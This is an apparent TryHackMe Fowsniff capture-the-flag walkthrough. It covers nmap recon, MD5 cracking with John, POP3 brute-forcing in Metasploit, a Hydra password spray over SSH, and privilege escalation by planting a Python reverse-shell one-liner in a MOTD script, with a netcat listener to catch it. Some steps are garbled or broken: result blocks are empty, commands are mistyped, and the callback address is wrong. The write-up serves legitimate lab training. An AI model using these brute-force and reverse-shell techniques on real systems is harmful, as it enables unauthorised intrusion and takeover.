# TryHackMe - Fowsniff CTF Walkthrough

## üõ† Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.242.74
```

## üìå Task 1: Initial Recon

### üîç Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

### üîì Crack Using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passwords -format=Raw-md5
```

**Cracked Results:**

```

```

SSH login attempts with these passwords failed.

## ‚úâÔ∏è Exploring POP3

### üõ∞ Nmap POP3 Capability Check:

```bash
nmap -sV --script=pop3-capabilities -p 110 10.10.242.74
```

**Capabilities:**

_pop3-capabilities: USER SASL(PLAIN) PIPELINING AUTH-RESP-CODE RESP-CODES TOP UIDL CAPA

### üõ∞ using metasploit:

First we need to create two files, one that has the user names and the other that has the passwords. Then
 ```bash
mfsconsole
set pops_login
set RHOST 10.10.242.74
set user_file user.txt
set pass_file pass.txt
run
```

Bam! seina works!

### üì¨ Access with Telnet:

Q. Looking through her emails, what was a temporary password set for her?
A. S1ck3nBluff+secureshell

```bash
telnet $IP 110
```

Then:

```
USER seina@fowsniff
PASS scoobydoo2
LIST
RETR 1
RETR 2
```

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

## üîê SSH Login (via Hydra)

In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
Use Hydra to brute-force usernames with known password:

```shell
hydra -p S1ck3nBluff+secureshell -L /home/username/Documents/THM/Fowsniff_CTF/users ssh://10.10.242.74
```

**Result:**

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

```

```bash
groups
users baksteen
```

Now lets looks for files

```bash
find / -type f -name *.sh -group users 2>/dev/null
```

**Found:**

```
/opt/cube/cube.sh
```

If you check /etc/update-motd.d/00-header you'll see that this invoked the cude.sh. Let's nano cube.sh and add the reverse shell TRH gave us, replacing IP for our IP address.

## üêö Add Reverse Shell Payload

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.242.74",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### üõ° Start Listener:

'''bash
nc -nlvp 1234
```
### üîÅ Re-login over SSH

```bash
ssh baksteen@10.10.242.74
```

When the login message executes `cube.sh`, the reverse shell connects back.

## üéâ Root Access Achieved!
